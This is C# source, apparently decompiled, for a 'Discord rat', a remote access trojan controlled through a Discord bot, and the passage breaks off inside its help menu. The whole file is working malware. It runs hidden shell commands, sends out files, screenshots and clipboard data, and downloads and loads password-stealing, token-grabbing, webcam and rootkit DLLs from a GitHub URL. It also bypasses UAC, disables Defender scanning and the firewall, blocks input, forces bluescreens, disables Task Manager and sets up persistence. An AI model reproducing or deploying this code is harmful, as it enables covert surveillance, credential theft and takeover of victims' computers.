using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Http;
using System.Net.WebSockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security;
using System.Security.Permissions;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using Microsoft.Win32;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("Discord rat")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Discord rat")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("cc12258f-af24-4773-a8e3-45d365bcbde9")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.6.1", FrameworkDisplayName = ".NET Framework 4.6.1")]
[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]
[assembly: AssemblyVersion("1.0.0.0")]
[module: UnverifiableCode]
namespace Discord_rat;

public class WsClient : IDisposable
{
	public Func<Stream, Task> ResponseReceived;

	public bool connected;

	private ClientWebSocket WS;

	private CancellationTokenSource CTS;

	public int ReceiveBufferSize { get; set; } = 8192;


	public async Task WaitUtillDead()
	{
		while (connected)
		{
			await Task.Delay(1000);
		}
	}

	public async Task ConnectAsync(string url)
	{
		if (WS != null)
		{
			if (WS.State == WebSocketState.Open)
			{
				return;
			}
			WS.Dispose();
		}
		WS = new ClientWebSocket();
		if (CTS != null)
		{
			CTS.Dispose();
		}
		CTS = new CancellationTokenSource();
		await WS.ConnectAsync(new Uri(url), CTS.Token);
		await Task.Factory.StartNew((Func<Task>)ReceiveLoop, CTS.Token, TaskCreationOptions.LongRunning, TaskScheduler.Default);
		connected = true;
	}

	public async Task DisconnectAsync()
	{
		if (WS == null)
		{
			connected = false;
			return;
		}
		if (WS.State == WebSocketState.Open)
		{
			CTS.CancelAfter(TimeSpan.FromSeconds(2.0));
			await WS.CloseOutputAsync(WebSocketCloseStatus.Empty, "", CancellationToken.None);
			await WS.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None);
		}
		WS.Dispose();
		WS = null;
		CTS.Dispose();
		CTS = null;
		connected = false;
	}

	private async Task ReceiveLoop()
	{
		CancellationToken loopToken = CTS.Token;
		MemoryStream outputStream = null;
		ArraySegment<byte> buffer = new ArraySegment<byte>(new byte[ReceiveBufferSize]);
		try
		{
			while (!loopToken.IsCancellationRequested)
			{
				Console.WriteLine("e1");
				outputStream = new MemoryStream(ReceiveBufferSize);
				WebSocketReceiveResult webSocketReceiveResult;
				do
				{
					webSocketReceiveResult = await WS.ReceiveAsync(buffer, CTS.Token);
					if (webSocketReceiveResult.MessageType != WebSocketMessageType.Close)
					{
						outputStream.Write(Enumerable.ToArray(buffer), 0, webSocketReceiveResult.Count);
					}
				}
				while (!webSocketReceiveResult.EndOfMessage);
				if (webSocketReceiveResult.MessageType != WebSocketMessageType.Close)
				{
					outputStream.Position = 0L;
					await Task.Factory.StartNew(() => ResponseReceived(outputStream));
					continue;
				}
				break;
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		finally
		{
			outputStream?.Dispose();
		}
	}

	public async Task SendMessageAsync(string message)
	{
		ArraySegment<byte> buffer = new ArraySegment<byte>(Encoding.UTF8.GetBytes(message));
		await WS.SendAsync(buffer, WebSocketMessageType.Text, endOfMessage: true, CancellationToken.None);
	}

	public void Dispose()
	{
		DisconnectAsync().Wait();
	}
}
public class Program
{
	internal struct LASTINPUTINFO
	{
		public uint cbSize;

		public uint dwTime;
	}

	public const int SPI_SETDESKWALLPAPER = 20;

	public const int SPIF_UPDATEINIFILE = 1;

	public const int SPIF_SENDCHANGE = 2;

	public static JavaScriptSerializer serializer = new JavaScriptSerializer();

	public static WsClient client = new WsClient();

	public static string BotToken = settings.Bottoken;

	public static string GuildId = settings.Guildid;

	public static string ChannelId = "unset";

	public static Dictionary<string, string> session_channel_holder = new Dictionary<string, string>();

	public static Dictionary<string, Assembly> dll_holder = new Dictionary<string, Assembly>();

	public static Dictionary<string, object> activator_holder = new Dictionary<string, object>();

	public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string>
	{
		{ "password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll" },
		{ "rootkit", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll" },
		{ "unrootkit", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll" },
		{ "webcam", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll" },
		{ "token", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll" }
	};

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("User32.dll")]
	private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	[DllImport("Kernel32.dll")]
	private static extern uint GetLastError();

	public static Dictionary<object, object> ObjectToDictionary(object obb)
	{
		return JsonToDictionary(DictionaryToJson(obb));
	}

	public static Dictionary<object, object>[] ObjectToArray(object obb)
	{
		return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
	}

	public static Dictionary<object, object> JsonToDictionary(string json)
	{
		return serializer.Deserialize<Dictionary<object, object>>(json);
	}

	public static string DictionaryToJson(object dict)
	{
		return serializer.Serialize(dict);
	}

	public static async Task Responsehandler(Stream inputStream)
	{
		Dictionary<object, object> dictionary = JsonToDictionary(new StreamReader(inputStream).ReadToEnd());
		Console.WriteLine(DictionaryToJson(dictionary));
		await handler(dictionary);
		inputStream.Dispose();
	}

	public static void Main(string[] args)
	{
		MainAsync().GetAwaiter().GetResult();
	}

	public static async Task MainAsync()
	{
		client.ResponseReceived = Responsehandler;
		await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encording=json");
		await client.WaitUtillDead();
	}

	public static async Task heartbeat(int milliseconds)
	{
		while (client.connected)
		{
			await Task.Delay(milliseconds);
			string text = DictionaryToJson(new Dictionary<object, object>
			{
				{ "op", 1 },
				{ "d", 5 }
			});
			Console.WriteLine(text);
			await client.SendMessageAsync(text);
		}
	}

	public static async Task login(string token)
	{
		int num = 32767;
		string text = DictionaryToJson(new Dictionary<object, object>
		{
			{ "op", 2 },
			{
				"d",
				new Dictionary<object, object>
				{
					{ "token", token },
					{ "intents", num },
					{
						"properties",
						new Dictionary<object, object>
						{
							{ "os", "linux" },
							{ "browser", "chrome" },
							{ "device", "chrome" }
						}
					}
				}
			}
		});
		Console.WriteLine(text);
		await client.SendMessageAsync(text);
	}

	public static async Task<string> CreateHostingChannel(Dictionary<object, object> data)
	{
		object obj = ObjectToDictionary(data["d"])["id"];
		object obb = ObjectToDictionary(data["d"])["channels"];
		int biggest = 1;
		Dictionary<object, object>[] array = ObjectToArray(obb);
		foreach (Dictionary<object, object> dictionary in array)
		{
			if ((int)dictionary["type"] == 0 && ((string)dictionary["name"]).StartsWith("session-"))
			{
				session_channel_holder[(string)dictionary["name"]] = dictionary["id"].ToString();
				int num = int.Parse(string.Join("", ((string)dictionary["name"]).ToCharArray().Where(char.IsDigit)));
				if (num >= biggest)
				{
					biggest = num + 1;
				}
			}
		}
		string requestUri = $"https://discord.com/api/v9/guilds/{(string)obj}/channels";
		string content = DictionaryToJson(new Dictionary<object, object>
		{
			{
				"name",
				"session-" + biggest
			},
			{ "type", 0 }
		});
		HttpClient httpClient = new HttpClient
		{
			DefaultRequestHeaders = { 
			{
				"authorization",
				"Bot " + BotToken
			} }
		};
		StringContent content2 = new StringContent(content, Encoding.UTF8, "application/json");
		HttpResponseMessage obj2 = await httpClient.PostAsync(requestUri, content2);
		obj2.EnsureSuccessStatusCode();
		Dictionary<object, object> dictionary2 = JsonToDictionary(await obj2.Content.ReadAsStringAsync());
		object new_channel_id = dictionary2["id"];
		httpClient.Dispose();
		object obj3 = "session-" + biggest;
		string text = await getip();
		string message = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", obj3, text, Environment.UserName, new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString());
		await Send_message((string)new_channel_id, message);
		return (string)new_channel_id;
	}

	public static async Task handler(Dictionary<object, object> data)
	{
		object obj = data["op"];
		if (!(obj is int))
		{
			return;
		}
		switch ((int)obj)
		{
		case 10:
			await login(BotToken);
			await heartbeat((int)ObjectToDictionary(data["d"])["heartbeat_interval"]);
			break;
		case 11:
			Console.WriteLine("recived heartbeat");
			break;
		case 0:
			switch (data["t"] as string)
			{
			case "READY":
			{
				Dictionary<object, object> dictionary2 = ObjectToDictionary(ObjectToDictionary(data["d"])["user"]);
				Console.WriteLine(dictionary2["username"]?.ToString() + "#" + dictionary2["discriminator"]);
				break;
			}
			case "GUILD_CREATE":
				if ((string)ObjectToDictionary(data["d"])["id"] == GuildId)
				{
					ChannelId = await CreateHostingChannel(data);
				}
				break;
			case "MESSAGE_CREATE":
			{
				Dictionary<object, object> dictionary = ObjectToDictionary(data["d"]);
				object obj2 = dictionary["guild_id"];
				object obj3 = dictionary["channel_id"];
				object obj4 = dictionary["content"];
				bool flag = false;
				List<string> list = new List<string>();
				Dictionary<object, object>[] array = ObjectToArray(dictionary["attachments"]);
				foreach (Dictionary<object, object> dictionary3 in array)
				{
					list.Add((string)dictionary3["url"]);
				}
				string[] attachment_urls = list.ToArray();
				if (ObjectToDictionary(dictionary["author"]).ContainsKey("bot"))
				{
					flag = (bool)ObjectToDictionary(dictionary["author"])["bot"];
				}
				if ((string)obj2 == GuildId && (string)obj3 == ChannelId && !flag)
				{
					await CommandHandler((string)obj4, attachment_urls);
				}
				break;
			}
			case "CHANNEL_CREATE":
			{
				Dictionary<object, object> dictionary = ObjectToDictionary(data["d"]);
				if ((string)dictionary["guild_id"] == GuildId && ((string)dictionary["name"]).StartsWith("session-"))
				{
					session_channel_holder[(string)dictionary["name"]] = dictionary["id"].ToString();
				}
				break;
			}
			case "CHANNEL_DELETE":
			{
				Dictionary<object, object> dictionary = ObjectToDictionary(data["d"]);
				if ((string)dictionary["id"] == ChannelId && ChannelId != "unset")
				{
					Application.Exit();
					Environment.Exit(0);
				}
				break;
			}
			}
			break;
		}
	}

	public static async Task<bool> Send_message(string channelid, string message)
	{
		string requestUri = $"https://discord.com/api/v9/channels/{channelid}/messages";
		string content = DictionaryToJson(new Dictionary<object, object> { { "content", message } });
		HttpClient httpClient = new HttpClient
		{
			DefaultRequestHeaders = { 
			{
				"authorization",
				"Bot " + BotToken
			} }
		};
		StringContent content2 = new StringContent(content, Encoding.UTF8, "application/json");
		try
		{
			HttpResponseMessage obj = await httpClient.PostAsync(requestUri, content2);
			obj.EnsureSuccessStatusCode();
			await obj.Content.ReadAsStringAsync();
			httpClient.Dispose();
			return true;
		}
		catch
		{
			httpClient.Dispose();
			return false;
		}
	}

	public static async Task<bool> Send_attachment(string channelid, string message, List<byte[]> attachments, string[] filenames)
	{
		HttpClient httpClient = new HttpClient();
		MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
		httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
		multipartFormDataContent.Add(new StringContent(message), "content");
		int num = 0;
		foreach (Tuple<string, byte[]> item in filenames.Zip(attachments, Tuple.Create))
		{
			multipartFormDataContent.Add(new ByteArrayContent(item.Item2, 0, item.Item2.Length), $"files[{num.ToString()}]", item.Item1);
			num++;
		}
		try
		{
			(await httpClient.PostAsync($"https://discord.com/api/v9/channels/{channelid}/messages", multipartFormDataContent)).EnsureSuccessStatusCode();
			httpClient.Dispose();
			return true;
		}
		catch
		{
			httpClient.Dispose();
			return false;
		}
	}

	public static byte[] StringToBytes(string input)
	{
		return Encoding.UTF8.GetBytes(input);
	}

	public static async Task ShellCommand(string command, string channelid)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = "cmd.exe",
			Arguments = "/C " + command,
			RedirectStandardError = true,
			RedirectStandardOutput = true
		};
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "output.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task Speak(string channelid, string message)
	{
		SpeechSynthesizer val = new SpeechSynthesizer();
		try
		{
			val.SetOutputToDefaultAudioDevice();
			Prompt val2 = new Prompt(message);
			val.Speak(val2);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		await Send_message(channelid, "Command executed!");
	}

	public static async Task dir(string channelid)
	{
		string text = string.Join("\n", Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "output.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task upload(string channelid, string filepath)
	{
		byte[] data;
		try
		{
			data = File.ReadAllBytes(filepath);
		}
		catch
		{
			await Send_message(channelid, "File not found!");
			return;
		}
		if (data.Length > 7500000)
		{
			using MultipartFormDataContent multipartFormContent = new MultipartFormDataContent();
			await Send_message(channelid, "File larger than 8mb, please wait while we upload to a third party!");
			HttpClient httpClient = new HttpClient();
			ByteArrayContent content = new ByteArrayContent(data);
			multipartFormContent.Add(content, "file", Path.GetFileName(filepath));
			HttpResponseMessage obj2 = await httpClient.PostAsync("https://file.io/", multipartFormContent);
			obj2.EnsureSuccessStatusCode();
			httpClient.Dispose();
			Dictionary<object, object> dictionary = JsonToDictionary(await obj2.Content.ReadAsStringAsync());
			if (!(bool)dictionary["success"])
			{
				await Send_message(channelid, "Error with uploading file!");
				return;
			}
			string text = (string)dictionary["link"];
			await Send_message(channelid, "File uploaded, heres the download link!\n" + text);
			await Send_message(ChannelId, "Command executed!");
		}
		else
		{
			await Send_attachment(channelid, "", new List<byte[]> { data }, new string[1] { Path.GetFileName(filepath) });
			await Send_message(ChannelId, "Command executed!");
		}
	}

	public static async Task<byte[]> LinkToBytes(string link)
	{
		Stream stream = new MemoryStream();
		await (await new HttpClient().GetAsync(link)).Content.CopyToAsync(stream);
		stream.Position = 0L;
		byte[] array = new byte[stream.Length];
		for (int i = 0; i < stream.Length; i += stream.Read(array, i, Convert.ToInt32(stream.Length) - i))
		{
		}
		return array;
	}

	public static async Task BytesToWallpaper(string channelid, byte[] picture)
	{
		string path = Path.GetTempFileName() + ".png";
		try
		{
			File.WriteAllBytes(path, picture);
		}
		catch
		{
			await Send_message(channelid, "Error writing file!");
			return;
		}
		try
		{
			SystemParametersInfo(20, 0, path, 3);
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
			await Send_message(channelid, "Command executed!");
		}
		catch
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
			await Send_message(channelid, "Error setting wallpaper!");
		}
	}

	[STAThread]
	public static async Task GetClipboard(string channelid)
	{
		string data = null;
		try
		{
			Exception threadEx = null;
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					data = Clipboard.GetText();
				}
				catch (Exception ex)
				{
					threadEx = ex;
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
		catch
		{
			await Send_message(channelid, "Error getting clipboard!");
			return;
		}
		if (data == null)
		{
			await Send_message(channelid, "Clipboard empty!");
		}
		else if (data.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(data) }, new string[1] { "output.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + data + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static uint GetIdleTime()
	{
		LASTINPUTINFO plii = default(LASTINPUTINFO);
		plii.cbSize = (uint)Marshal.SizeOf(plii);
		GetLastInputInfo(ref plii);
		return (uint)Environment.TickCount - plii.dwTime;
	}

	public static long GetLastInputTime()
	{
		LASTINPUTINFO plii = default(LASTINPUTINFO);
		plii.cbSize = (uint)Marshal.SizeOf(plii);
		if (!GetLastInputInfo(ref plii))
		{
			throw new Exception(GetLastError().ToString());
		}
		return plii.dwTime;
	}

	public static async Task GetScreenshot(string channelid)
	{
		Bitmap val = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, (PixelFormat)2498570);
		Graphics.FromImage((Image)val).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, (CopyPixelOperation)13369376);
		Stream stream = new MemoryStream();
		((Image)val).Save(stream, ImageFormat.Png);
		stream.Position = 0L;
		byte[] array = new byte[stream.Length];
		for (int i = 0; i < stream.Length; i += stream.Read(array, i, Convert.ToInt32(stream.Length) - i))
		{
		}
		await Send_attachment(channelid, "", new List<byte[]> { array }, new string[1] { "screenshot.png" });
		await Send_message(ChannelId, "Command executed!");
	}

	public static async Task Delete(string id)
	{
		string requestUri = "https://discord.com/api/v9/channels/" + id;
		HttpClient httpClient = new HttpClient();
		httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
		try
		{
			await httpClient.DeleteAsync(requestUri);
		}
		catch
		{
		}
	}

	public static async Task Kill(string session)
	{
		if (session.ToLower() == "all")
		{
			foreach (string key in session_channel_holder.Keys)
			{
				if (!(session_channel_holder[key] == ChannelId))
				{
					await Delete(session_channel_holder[key]);
				}
			}
			await Delete(ChannelId);
		}
		else if (session_channel_holder.ContainsKey(session.ToLower()))
		{
			await Delete(session_channel_holder[session.ToLower()]);
		}
	}

	public static async Task uacbypass(string path, string channelid)
	{
		Environment.SetEnvironmentVariable("windir", "\"" + path + "\" ;#", EnvironmentVariableTarget.User);
		Process process = new Process
		{
			StartInfo = 
			{
				UseShellExecute = false,
				FileName = "SCHTASKS.exe",
				RedirectStandardError = true,
				RedirectStandardOutput = true,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
			}
		};
		try
		{
			process.Start();
			await Task.Delay(1500);
		}
		catch
		{
			await Send_message(channelid, "Error with uacbypass!");
		}
		Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
	}

	public static void Bluescreen()
	{
		RtlAdjustPrivilege(19, bEnablePrivilege: true, IsThreadPrivilege: false, out var _);
		NtRaiseHardError(3221225506u, 0u, 0u, IntPtr.Zero, 6u, out var _);
	}

	public static async Task ProcKill(string channelid, string procname)
	{
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i++)
		{
			if (processes[i].ProcessName == procname)
			{
				processes[i].Kill();
			}
		}
		await Send_message(channelid, "Command executed!");
	}

	public static async Task DisableDefender(string channelid)
	{
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "powershell.exe";
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.Arguments = "-Command Add-MpPreference -ExclusionPath \"C:\\\"";
		process.Start();
		await Send_message(channelid, "Command executed!");
	}

	public static async Task DisableFirewall(string channelid)
	{
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "NetSh.exe";
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.Arguments = "Advfirewall set allprofiles state off";
		process.Start();
		await Send_message(channelid, "Command executed!");
	}

	public static async Task PlayAudio(string channelid, byte[] audio)
	{
		using (MemoryStream memoryStream = new MemoryStream(audio))
		{
			new SoundPlayer((Stream)memoryStream).Play();
		}
		await Send_message(channelid, "Command executed!");
	}

	public static void critproc()
	{
		int processInformation = 1;
		int processInformationClass = 29;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
	}

	public static void uncritproc()
	{
		int processInformation = 0;
		int processInformationClass = 29;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
	}

	public static void DisableTaskManager()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (registryKey.GetValue("DisableTaskMgr") == null)
		{
			registryKey.SetValue("DisableTaskMgr", "1");
		}
		registryKey.Close();
	}

	public static void EnableTaskManager()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (registryKey.GetValue("DisableTaskMgr") != null)
		{
			registryKey.DeleteValue("DisableTaskMgr");
		}
		registryKey.Close();
	}

	public static void addstartupnonadmin()
	{
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue("$77" + Path.GetFileName(Assembly.GetEntryAssembly().Location), Assembly.GetEntryAssembly().Location);
	}

	public static void addstartupadmin()
	{
		string arguments = string.Format("/create /tn \"{1}\" /tr \"'{0}'\" /sc onlogon /rl HIGHEST", Assembly.GetEntryAssembly().Location, "$77" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "SCHTASKS.exe";
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.Arguments = arguments;
		process.Start();
	}

	public static async Task<string> geolocate()
	{
		HttpResponseMessage obj = await new HttpClient().GetAsync("https://geolocation-db.com/json");
		obj.EnsureSuccessStatusCode();
		Dictionary<object, object> dictionary = JsonToDictionary(await obj.Content.ReadAsStringAsync());
		return string.Format("http://www.google.com/maps/place/{0},{1}", dictionary["latitude"].ToString(), dictionary["longitude"].ToString());
	}

	public static async Task<string> getip()
	{
		HttpResponseMessage obj = await new HttpClient().GetAsync("https://geolocation-db.com/json");
		obj.EnsureSuccessStatusCode();
		return JsonToDictionary(await obj.Content.ReadAsStringAsync())["IPv4"].ToString();
	}

	public static async Task getprocs(string channelid)
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			list.Add(process.ProcessName);
		}
		string text = string.Join("\n", list);
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "output.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task LoadDll(string name, byte[] data)
	{
		dll_holder[name] = Assembly.Load(data);
	}

	public static async Task<string> password()
	{
		if (!dll_holder.ContainsKey("password"))
		{
			await LoadDll("password", await LinkToBytes(dll_url_holder["password"]));
		}
		dynamic val = Activator.CreateInstance(dll_holder["password"].GetType("PasswordStealer.Stealer"));
		MethodInfo methodInfo = val.GetType().GetMethod("Run", BindingFlags.Instance | BindingFlags.Public);
		return (string)methodInfo.Invoke(val, new object[0]);
	}

	public static async Task sendpassword(string channelid)
	{
		string text = await password();
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "password.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static void rootkitaddpid(int pid)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\$77config\\pid");
		registryKey.SetValue(Path.GetRandomFileName(), pid, RegistryValueKind.DWord);
		registryKey.Close();
	}

	public static void rootkitaddpath(string path)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\$77config\\paths");
		registryKey.SetValue(Path.GetRandomFileName(), path, RegistryValueKind.String);
		registryKey.Close();
	}

	public static async Task Rootkit(string channelid)
	{
		if (!dll_holder.ContainsKey("rootkit"))
		{
			await LoadDll("rootkit", await LinkToBytes(dll_url_holder["rootkit"]));
		}
		MethodInfo entryPoint = dll_holder["rootkit"].EntryPoint;
		try
		{
			string[][] array = ((entryPoint.GetParameters().Length == 0) ? null : new string[1][] { new string[0] });
			object[] parameters = array;
			entryPoint.Invoke(null, parameters);
			rootkitaddpath(Assembly.GetEntryAssembly().Location);
			rootkitaddpid(Process.GetCurrentProcess().Id);
			await Send_message(channelid, "Command executed!");
		}
		catch
		{
			await Send_message(channelid, "Error executing rootkit!");
		}
	}

	public static async Task UnRootkit(string channelid)
	{
		if (!dll_holder.ContainsKey("unrootkit"))
		{
			await LoadDll("unrootkit", await LinkToBytes(dll_url_holder["unrootkit"]));
		}
		MethodInfo entryPoint = dll_holder["unrootkit"].EntryPoint;
		try
		{
			string[][] array = ((entryPoint.GetParameters().Length == 0) ? null : new string[1][] { new string[0] });
			object[] parameters = array;
			entryPoint.Invoke(null, parameters);
			await Send_message(channelid, "Command executed!");
		}
		catch
		{
			await Send_message(channelid, "Error removing rootkit!");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task helpmenu(string channelid)
	{
		string text = "--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user's on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user's current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process's\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
		if (text.Length >= 1990)
		{
